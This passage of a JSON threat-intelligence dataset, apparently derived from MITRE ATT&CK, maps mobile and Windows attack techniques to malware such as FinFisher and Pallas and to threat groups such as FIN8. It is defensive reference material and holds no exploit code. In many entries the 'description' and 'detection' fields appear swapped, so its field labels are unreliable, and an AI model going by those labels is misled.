                "detection": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1404",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exploit OS Vulnerability",
                "chain_phase": "privilege-escalation",
                "description": [],
                "detection": "A malicious app can exploit unpatched vulnerabilities in the operating system to obtain escalated privileges.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1436",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Commonly Used Port",
                "chain_phase": "command-and-control",
                "description": [],
                "detection": "Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. \n\nThey may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1412",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Capture SMS Messages",
                "chain_phase": "collection",
                "description": "On Android, the user can view which applications have permission to access SMS messages through the device settings, and the user can choose to revoke the permission.",
                "detection": "A malicious application could capture sensitive data sent via SMS, including authentication credentials. SMS is frequently used to transmit codes used for multi-factor authentication.\n\nOn Android, a malicious application must request and obtain permission (either at app install time or run time) in order to receive SMS messages. Alternatively, a malicious application could attempt to perform an operating system privilege escalation attack to bypass the permission requirement.\n\nOn iOS, applications cannot access SMS messages in normal operation, so an adversary would need to attempt to perform an operating system privilege escalation attack to potentially be able to access SMS messages.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1429",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Capture Audio",
                "chain_phase": "collection",
                "description": "On both Android (6.0 and up) and iOS, the user can view which applications have permission to use the microphone through the device settings screen, and the user can choose to revoke the permissions.",
                "detection": "Adversaries may capture audio to collect information on a user of a mobile device using standard operating system APIs. Adversaries may target audio information such as user conversations, surroundings, phone calls, or other sensitive information.\n\nAndroid and iOS, by default, requires that an application request access to microphone devices from the user. In Android, applications must hold the <code>android.permission.RECORD_AUDIO</code> permission to access the microphone and the <code>android.permission.CAPTURE_AUDIO_OUTPUT</code> permission to access audio output such as speakers. Android does not allow third-party applications to hold <code>android.permission.CAPTURE_AUDIO_OUTPUT</code>, so audio output can only be obtained by privileged applications (distributed by Google or the device vendor) or after a successful privilege escalation attack. In iOS, applications must include the `NSMicrophoneUsageDescription` key in their `Info.plist` file.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1430",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Location Tracking",
                "chain_phase": "collection",
                "description": "On both Android (6.0 and up) and iOS, the user can view which applications have permission to access device location through the device settings screen, and the user can choose to revoke the permissions.",
                "detection": "An adversary could use a malicious or exploited application to surreptitiously track the device's physical location through use of standard operating system APIs.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1433",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Access Call Log",
                "chain_phase": "collection",
                "description": "On Android 6.0 and up, the user can view which applications have permission to access call log information through the device settings screen, and the user can choose to revoke the permissions.",
                "detection": "On Android, an adversary could call standard operating system APIs from a malicious application to gather call log data, or with escalated privileges could directly access files containing call log data.\n\nOn iOS, applications do not have access to the call log, so privilege escalation would be required in order to access the data.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "S0182",
            "type": "tool",
            "attributes": {
                "name": "FinFisher",
                "aliases": [
                    "FinSpy"
                ],
                "labels": [
                    "malware"
                ],
                "description": "FinFisher is a government-grade commercial surveillance spyware reportedly sold exclusively to government agencies for use in targeted and lawful criminal investigations. It is heavily obfuscated and uses multiple anti-analysis techniques. It has other variants including Wingbird.",
                "platforms": [
                    "Windows",
                    "Android"
                ],
                "techniques": {
                    "T1574.002": "DLL Side-Loading",
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1497.001": "System Checks",
                    "T1518.001": "Security Software Discovery",
                    "T1134.001": "Token Impersonation/Theft",
                    "T1056.004": "Credential API Hooking",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1027.002": "Software Packing",
                    "T1027.001": "Binary Padding",
                    "T1548.002": "Bypass User Account Control",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1542.003": "Bootkit",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1113": "Screen Capture",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1012": "Query Registry",
                    "T1404": "Exploit OS Vulnerability",
                    "T1436": "Commonly Used Port",
                    "T1412": "Capture SMS Messages",
                    "T1429": "Capture Audio",
                    "T1430": "Location Tracking",
                    "T1433": "Access Call Log"
                }
            },
            "val": 28
        },
        {
            "id": "T1512",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Capture Camera",
                "chain_phase": "collection",
                "description": "On Android and iOS, the user can view which applications have permission to use the camera through the device settings screen, and the user can choose to revoke the permissions.",
                "detection": "Adversaries may utilize the camera to capture information about the user, their surroundings, or other physical identifiers. Adversaries may use the physical camera devices on a mobile device to capture images or video. By default, in Android and iOS, an application must request permission to access a camera device which is granted by the user through a request prompt. In Android, applications must hold the `android.permission.CAMERA` permission to access the camera. In iOS, applications must include the `NSCameraUsageDescription` key in the `Info.plist` file, and must request access to the camera at runtime.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1507",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Network Information Discovery",
                "chain_phase": "collection",
                "description": [],
                "detection": "Adversaries may use device sensors to collect information about nearby networks, such as Wi-Fi and Bluetooth.",
                "is_subtype": false,
                "platforms": [
                    "Android"
                ]
            }
        },
        {
            "id": "T1476",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Deliver Malicious App via Other Means",
                "chain_phase": "initial-access",
                "description": "* An EMM/MDM or mobile threat defense solution may be able to identify the presence of apps installed from sources other than an authorized app store. \n* An EMM/MDM or mobile threat defense solution may be able to identify Android devices configured to allow apps to be installed from \"Unknown Sources\".\n* Enterprise email security solutions can identify the presence of Android or iOS application packages within email messages.",
                "detection": "Malicious applications are a common attack vector used by adversaries to gain a presence on mobile devices. This technique describes installing a malicious application on targeted mobile devices without involving an authorized app store (e.g., Google Play Store or Apple App Store). Adversaries may wish to avoid placing malicious applications in an authorized app store due to increased potential risk of detection or other reasons. However, mobile devices often are configured to allow application installation only from an authorized app store which would prevent this technique from working.\n\nDelivery methods for the malicious application include:\n\n* Spearphishing Attachment - Including the mobile app package as an attachment to an email message.\n* Spearphishing Link - Including a link to the mobile app package within an email, text message (e.g. SMS, iMessage, Hangouts, WhatsApp, etc.), web site, QR code, or other means.\n* Third-Party App Store - Installed from a third-party app store (as opposed to an authorized app store that the device implicitly trusts as part of its default behavior), which may not apply the same level of scrutiny to apps as applied by an authorized app store.\n\nSome Android malware comes with functionality to install additional applications, either automatically or when the adversary instructs it to.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1411",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Input Prompt",
                "chain_phase": "credential-access",
                "description": "The user can view and manage which applications hold the SYSTEM_ALERT_WINDOW permission to create overlay windows on top of other apps through the device settings in Apps & notifications -> Special app access -> Display over other apps (the exact menu location may vary between Android versions).",
                "detection": "The operating system and installed applications often have legitimate needs to prompt the user for sensitive information such as account credentials, bank account information, or Personally Identifiable Information (PII). Adversaries may mimic this functionality to prompt users for sensitive information.\n\nCompared to traditional PCs, the constrained display size of mobile devices may impair the ability to provide users with contextual information, making users more susceptible to this technique’s use.\n\nSpecific approaches to this technique include:\n\n### Impersonate the identity of a legitimate application\n\nA malicious application could impersonate the identity of a legitimate application (e.g. use the same application name and/or icon) and get installed on the device. The malicious app could then prompt the user for sensitive information.\n\n### Display a prompt on top of a running legitimate application\n\nA malicious application could display a prompt on top of a running legitimate application to trick users into entering sensitive information into the malicious application rather than the legitimate application. Typically, the malicious application would need to know when the targeted application (and individual activity within the targeted application) is running in the foreground, so that the malicious application knows when to display its prompt. Android 5.0 and 5.1.1, respectively, increased the difficulty of determining the current foreground application through modifications to the `ActivityManager` API.. A malicious application can still abuse Android’s accessibility features to determine which application is currently in the foreground. Approaches to display a prompt include:\n\n* A malicious application could start a new activity on top of a running legitimate application. Android 10 places new restrictions on the ability for an application to start a new activity on top of another application, which may make it more difficult for adversaries to utilize this technique.\n* A malicious application could create an application overlay window on top of a running legitimate application. Applications must hold the `SYSTEM_ALERT_WINDOW` permission to create overlay windows. This permission is handled differently than typical Android permissions, and at least under certain conditions is automatically granted to applications installed from the Google Play Store. The `SYSTEM_ALERT_WINDOW` permission and its associated ability to create application overlay windows are expected to be deprecated in a future release of Android in favor of a new API.\n\n### Fake device notifications\n\nA malicious application could send fake device notifications to the user. Clicking on the device notification could trigger the malicious application to display an input prompt.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1437",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Standard Application Layer Protocol",
                "chain_phase": "command-and-control",
                "description": [],
                "detection": "Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic.\n\nIn the mobile environment, the Google Cloud Messaging (GCM; two-way) and Apple Push Notification Service (APNS; one-way server-to-device) are commonly used protocols on Android and iOS respectively that would blend in with routine device traffic and are difficult for enterprises to inspect. Google reportedly responds to reports of abuse by blocking access to GCM.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1406",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Obfuscated Files or Information",
                "chain_phase": "defense-evasion",
                "description": "Malicious obfuscation of files or information can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversary behavior.",
                "detection": "An app could contain malicious code in obfuscated or encrypted form, then deobfuscate or decrypt the code at runtime to evade many app vetting techniques.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1447",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Delete Device Data",
                "chain_phase": "impact",
                "description": "Mobile security products can detect which applications can request device administrator permissions. Users can view applications with administrator access through the device settings, and may also notice if user data is inexplicably missing.",
                "detection": "Adversaries may wipe a device or delete individual files in order to manipulate external outcomes or hide activity. An application must have administrator access to fully wipe the device, while individual files may not require special permissions to delete depending on their storage location. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The impact file deletion will have depends on the type of data as well as the goals and objectives of the adversary, but can include deleting update files to evade detection or deleting attacker-specified files for impact.",
                "is_subtype": false,
                "platforms": [
                    "Android"
                ]
            }
        },
        {
            "id": "T1418",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Application Discovery",
                "chain_phase": "defense-evasion",
                "description": [],
                "detection": "Adversaries may seek to identify all applications installed on the device. One use case for doing so is to identify the presence of endpoint security applications that may increase the adversary's risk of detection. Another use case is to identify the presence of applications that the adversary may wish to target.\n\nOn Android, applications can use methods in the PackageManager class  to enumerate other apps installed on device, or an entity with shell access can use the pm command line tool.\n\nOn iOS, apps can use private API calls to obtain a list of other apps installed on the device.  However, use of private API calls will likely prevent the application from being distributed through Apple's App Store.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1426",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Information Discovery",
                "chain_phase": "discovery",
                "description": [],
                "detection": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, and architecture.\n\nOn Android, much of this information is programmatically accessible to applications through the android.os.Build class.\n\nOn iOS, techniques exist for applications to programmatically access this information.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1409",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Access Stored Application Data",
                "chain_phase": "collection",
                "description": "Accessing stored application data can be difficult to detect, and therefore enterprises may be better served focusing on detection at other stages of adversarial behavior.",
                "detection": "Adversaries may access and collect application data resident on the device. Adversaries often target popular applications such as Facebook, WeChat, and Gmail.\n\nThis technique requires either escalated privileges or for the targeted app to have stored the data in an insecure manner (e.g., with insecure file permissions or in an insecure location such as an external storage directory).",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "T1432",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Access Contact List",
                "chain_phase": "collection",
                "description": "On both Android (6.0 and up) and iOS, the user can view which applications have permission to access contact list information through the device settings screen, and the user can choose to revoke the permissions.",
                "detection": "An adversary could call standard operating system APIs from a malicious application to gather contact list (i.e., address book) data, or with escalated privileges could directly access files containing contact list data.",
                "is_subtype": false,
                "platforms": [
                    "Android",
                    "iOS"
                ]
            }
        },
        {
            "id": "S0399",
            "type": "tool",
            "attributes": {
                "name": "Pallas",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Pallas is mobile surveillanceware that was custom-developed by Dark Caracal.",
                "platforms": [
                    "Android"
                ],
                "techniques": {
                    "T1512": "Capture Camera",
                    "T1507": "Network Information Discovery",
                    "T1476": "Deliver Malicious App via Other Means",
                    "T1411": "Input Prompt",
                    "T1437": "Standard Application Layer Protocol",
                    "T1406": "Obfuscated Files or Information",
                    "T1447": "Delete Device Data",
                    "T1418": "Application Discovery",
                    "T1426": "System Information Discovery",
                    "T1412": "Capture SMS Messages",
                    "T1409": "Access Stored Application Data",
                    "T1429": "Capture Audio",
                    "T1430": "Location Tracking",
                    "T1432": "Access Contact List",
                    "T1433": "Access Call Log"
                }
            },
            "val": 15
        },
        {
            "id": "G0078",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Gorgon Group",
                "aliases": [],
                "description": "Gorgon Group is a threat group consisting of members who are suspected to be Pakistan-based or have other connections to Pakistan. The group has performed a mix of criminal and targeted attacks, including campaigns against government organizations in the United Kingdom, Spain, Russia, and the United States.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0385": "njRAT",
                    "S0336": "NanoCore",
                    "S0332": "Remcos",
                    "S0262": "QuasarRAT"
                },
                "techniques": {
                    "T1564.003": "Hidden Window",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1562.001": "Disable or Modify Tools",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1055.012": "Process Hollowing",
                    "T1055.002": "Portable Executable Injection",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1065": "Uncommonly Used Port"
                }
            }
        },
        {
            "id": "S0332",
            "type": "tool",
            "attributes": {
                "name": "Remcos",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "Remcos is a closed-source tool that is marketed as a remote control and surveillance software by a company called Breaking Security. Remcos has been observed being used in malware campaigns.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.006": "Python",
                    "T1059.003": "Windows Command Shell",
                    "T1497.001": "System Checks",
                    "T1056.001": "Keylogging",
                    "T1548.002": "Bypass User Account Control",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1125": "Video Capture",
                    "T1123": "Audio Capture",
                    "T1115": "Clipboard Data",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1090": "Proxy",
                    "T1083": "File and Directory Discovery",
                    "T1055": "Process Injection",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 16
        },
        {
            "id": "S0262",
            "type": "tool",
            "attributes": {
                "name": "QuasarRAT",
                "aliases": [
                    "xRAT"
                ],
                "labels": [
                    "tool"
                ],
                "description": "QuasarRAT is an open-source, remote access tool that is publicly available on GitHub. QuasarRAT is developed in the C# language.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1059.003": "Windows Command Shell",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1555": "Credentials from Password Stores",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1553.002": "Code Signing",
                    "T1552.001": "Credentials In Files",
                    "T1053.005": "Scheduled Task",
                    "T1125": "Video Capture",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1090": "Proxy",
                    "T1082": "System Information Discovery"
                }
            },
            "val": 14
        },
        {
            "id": "G0077",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Leafminer",
                "aliases": [
                    "Raspite"
                ],
                "description": "Leafminer is an Iranian threat group that has targeted government organizations and business entities in the Middle East since at least early 2017.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0413": "MailSniper",
                    "S0349": "LaZagne",
                    "S0029": "PsExec",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1059.007": "JavaScript",
                    "T1003.004": "LSA Secrets",
                    "T1003.005": "Cached Domain Credentials",
                    "T1114.002": "Remote Email Collection",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1555": "Credentials from Password Stores",
                    "T1003.001": "LSASS Memory",
                    "T1110.003": "Password Spraying",
                    "T1552.001": "Credentials In Files",
                    "T1136.001": "Local Account",
                    "T1055.013": "Process Doppelgänging",
                    "T1189": "Drive-by Compromise",
                    "T1083": "File and Directory Discovery",
                    "T1046": "Network Service Scanning",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery"
                }
            }
        },
        {
            "id": "S0413",
            "type": "tool",
            "attributes": {
                "name": "MailSniper",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used by a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.",
                "platforms": [
                    "Office 365",
                    "Windows",
                    "Azure AD"
                ],
                "techniques": {
                    "T1087.003": "Email Account",
                    "T1114.002": "Remote Email Collection",
                    "T1110.003": "Password Spraying"
                }
            },
            "val": 3
        },
        {
            "id": "G0079",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "DarkHydrus",
                "aliases": [],
                "description": "DarkHydrus is a threat group that has targeted government agencies and educational institutions in the Middle East since at least 2016. The group heavily leverages open-source tools and custom payloads for carrying out attacks.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0270": "RogueRobin",
                    "S0154": "Cobalt Strike",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1564.003": "Hidden Window",
                    "T1204.002": "Malicious File",
                    "T1059.001": "PowerShell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1221": "Template Injection",
                    "T1187": "Forced Authentication"
                }
            }
        },
        {
            "id": "S0270",
            "type": "tool",
            "attributes": {
                "name": "RogueRobin",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "RogueRobin is a payload used by DarkHydrus that has been developed in PowerShell and C#.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1132.001": "Standard Encoding",
                    "T1102.002": "Bidirectional Communication",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1497.001": "System Checks",
                    "T1518.001": "Security Software Discovery",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.010": "Regsvr32",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 19
        },
        {
            "id": "G0071",
            "type": "group",
            "attributes": {
                "val": 8,
                "name": "Orangeworm",
                "aliases": [],
                "description": "Orangeworm is a group that has targeted organizations in the healthcare sector in the United States, Europe, and Asia since at least 2015, likely for the purpose of corporate espionage.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0236": "Kwampirs",
                    "S0106": "cmd",
                    "S0104": "netstat",
                    "S0103": "route",
                    "S0100": "ipconfig",
                    "S0099": "Arp",
                    "S0096": "Systeminfo",
                    "S0039": "Net"
                },
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1021.002": "SMB/Windows Admin Shares"
                }
            }
        },
        {
            "id": "S0236",
            "type": "tool",
            "attributes": {
                "name": "Kwampirs",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Kwampirs is a backdoor Trojan used by Orangeworm. It has been found on machines which had software installed for the use and control of high-tech imaging devices such as X-Ray and MRI machines.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1069.001": "Local Groups",
                    "T1069.002": "Domain Groups",
                    "T1087.001": "Local Account",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1036.004": "Masquerade Task or Service",
                    "T1027.001": "Binary Padding",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1201": "Password Policy Discovery",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1135": "Network Share Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1008": "Fallback Channels",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 22
        },
        {
            "id": "S0103",
            "type": "tool",
            "attributes": {
                "name": "route",
                "aliases": [
                    "route.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "route can be used to find or change information within the local system IP routing table.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 1
        },
        {
            "id": "S0099",
            "type": "tool",
            "attributes": {
                "name": "Arp",
                "aliases": [
                    "arp.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "Arp displays information about a system's Address Resolution Protocol (ARP) cache.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 1
        },
        {
            "id": "G0076",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "Thrip",
                "aliases": [],
                "description": "Thrip is an espionage group that has targeted satellite communications, telecoms, and defense contractor companies in the U.S. and Southeast Asia. The group uses custom malware as well as \"living off the land\" techniques.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0261": "Catchamas",
                    "S0029": "PsExec",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1059.001": "PowerShell",
                    "T1219": "Remote Access Software"
                }
            }
        },
        {
            "id": "S0261",
            "type": "tool",
            "attributes": {
                "name": "Catchamas",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Catchamas is a Windows Trojan that steals information from compromised systems.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1056.001": "Keylogging",
                    "T1036.004": "Masquerade Task or Service",
                    "T1543.003": "Windows Service",
                    "T1115": "Clipboard Data",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1016": "System Network Configuration Discovery",
                    "T1010": "Application Window Discovery"
                }
            },
            "val": 9
        },
        {
            "id": "G0063",
            "type": "group",
            "attributes": {
                "val": 0,
                "name": "BlackOasis",
                "aliases": [],
                "description": "BlackOasis is a Middle Eastern threat group that is believed to be a customer of Gamma Group. The group has shown interest in prominent figures in the United Nations, as well as opposition bloggers, activists, regional news correspondents, and think tanks.   A group known by Microsoft as NEODYMIUM is reportedly associated closely with BlackOasis operations, but evidence that the group names are aliases has not been identified.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": [],
                "techniques": {
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "G0061",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "FIN8",
                "aliases": [],
                "description": "FIN8 is a financially motivated threat group known to launch tailored spearphishing campaigns targeting the retail, restaurant, and hospitality industries.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0197": "PUNCHTRACK",
                    "S0196": "PUNCHBUGGY",
                    "S0105": "dsquery",
                    "S0039": "Net"
                },
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1074.002": "Remote Data Staging",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1518.001": "Security Software Discovery",
                    "T1560.001": "Archive via Utility",
                    "T1003.001": "LSASS Memory",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1070.004": "File Deletion",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1053.005": "Scheduled Task",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1078": "Valid Accounts",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1047": "Windows Management Instrumentation",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery"
                }
            }
        },
        {
            "id": "S0197",
            "type": "tool",
            "attributes": {
                "name": "PUNCHTRACK",
                "aliases": [
                    "PSVC"
                ],
                "labels": [
                    "malware"
                ],
                "description": "PUNCHTRACK is non-persistent point of sale (POS) system malware utilized by FIN8 to scrape payment card data.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1027": "Obfuscated Files or Information",
                    "T1005": "Data from Local System"
                }
            },
            "val": 3
        },
        {
            "id": "T1546.009",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "AppCert DLLs",
                "chain_phase": "privilege-escalation",
                "description": "Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. (Citation: Elastic Process Injection July 2017) \n\nTools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location. (Citation: TechNet Autoruns) (Citation: Sysinternals AppCertDlls Oct 2007)\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.",
                "detection": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. \n\nSimilar to Process Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0196",
            "type": "tool",
            "attributes": {
                "name": "PUNCHBUGGY",
                "aliases": [
                    "ShellTea"
                ],
                "labels": [
                    "malware"
                ],
                "description": "PUNCHBUGGY is a backdoor malware used by FIN8 that has been observed targeting POS networks in the hospitality industry.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1074.001": "Local Data Staging",
                    "T1059.006": "Python",
                    "T1059.001": "PowerShell",
                    "T1518.001": "Security Software Discovery",
                    "T1087.001": "Local Account",
                    "T1560.001": "Archive via Utility",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
